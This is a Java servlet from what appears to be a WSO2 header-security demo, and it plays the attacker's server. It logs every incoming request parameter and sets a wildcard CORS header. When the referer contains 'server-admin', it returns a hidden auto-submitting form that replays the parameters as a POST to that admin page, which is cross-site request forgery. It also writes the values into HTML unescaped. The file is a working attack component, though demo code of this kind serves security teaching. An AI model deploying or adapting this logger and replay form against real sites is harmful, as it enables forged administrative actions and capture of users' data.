package org.wso2.security.demo.headersecurity.logger;

import java.io.IOException;
import java.util.Arrays;
import java.util.Enumeration;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Servlet implementation class Logger
 */
public class Logger extends HttpServlet {
	private static final long serialVersionUID = 1L;

	@SuppressWarnings("unchecked")
	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		response.addHeader("Access-Control-Allow-Origin", "*");

		System.out.println("------------------------------------------------------------------------");
		System.out.println("Request URL : " + request.getRequestURL() + " (" + request.getMethod() + ")");

		Enumeration<String> parameterNames = request.getParameterNames();
		while (parameterNames.hasMoreElements()) {
			String name = parameterNames.nextElement();
			System.out.println(name + " : " + Arrays.asList(request.getParameterValues(name)));
		}

		// Rule for Alice's datacente monitoring panel
		if (request.getHeader("referer") != null && request.getHeader("referer").contains("server-admin")) {
			response.getWriter().write("<html>");
			response.getWriter().write(" <head>");
			response.getWriter().write(" </head>");
			response.getWriter().write(" <body>");
			response.getWriter().write("   <form style=\"display: none;\" id=\"mainform\" action=\""+request.getHeader("referer")+"\" method=\"POST\">");
			
			parameterNames = request.getParameterNames();
			while (parameterNames.hasMoreElements()) {
				String name = parameterNames.nextElement();
				String values[] = request.getParameterValues(name);
				for(String value : values) {
					response.getWriter().write("     <input type=\"hidden\" name=\""+name+"\" value=\""+value+"\" >");
				}
			}
			
			response.getWriter().write("   </form>");
			response.getWriter().write("   <script> document.getElementById('mainform').submit() </script>");
			response.getWriter().write(" </body>");
			response.getWriter().write("</html>");
		} else {
			response.getWriter().write("done");
		}
		
		System.out.println("------------------------------------------------------------------------");
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		doGet(request, response);
	}

}
